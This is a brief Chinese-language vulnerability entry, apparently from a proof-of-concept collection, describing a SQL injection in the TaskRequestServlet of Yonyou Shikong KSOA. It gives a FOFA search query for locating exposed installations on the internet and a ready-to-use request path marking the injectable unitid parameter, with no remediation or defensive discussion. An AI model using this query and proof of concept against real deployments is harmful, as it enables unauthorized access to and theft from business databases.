# 用友时空 KSOA TaskRequestServlet sql注入漏洞

    ## fofa

```
body="onmouseout=\"this.classname='btn btnOff'\""
```

## poc

```
/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1*&password=1,
```

![image](https://s1.ax1x.com/2023/08/11/pPnYiwR.png)
